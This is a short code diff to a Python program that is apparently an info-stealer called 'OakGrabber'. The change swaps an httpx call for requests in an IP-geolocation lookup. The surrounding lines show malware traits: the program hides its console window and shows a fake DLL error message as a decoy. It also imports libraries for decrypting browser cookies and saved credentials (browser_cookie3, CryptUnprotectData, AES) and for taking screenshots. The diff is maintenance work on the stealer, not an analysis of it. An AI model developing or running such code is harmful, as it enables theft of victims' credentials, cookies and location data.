@@ -12,7 +12,7 @@ error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but 
 
 
 if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
-import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, httpx, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
+import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
 from win32crypt import CryptUnprotectData
 from shutil import copy2
 from tkinter import messagebox
@@ -22,7 +22,6 @@ from zipfile import ZipFile
 from threading import Thread
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-from urllib.request import Request, urlopen
 
 filename =  os.path.basename(sys.argv[0])
 appdata = os.getenv("localappdata")
@@ -82,7 +81,7 @@ def main():
     os.chdir(roaming+ "/OakGrabber")
     if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
-    gr = httpx.get("https://ipinfo.io/json")
+    gr = requests.get("https://ipinfo.io/json")
     if gr.status_code == 200:
             data = gr.json()
             ip = data.get('ip')
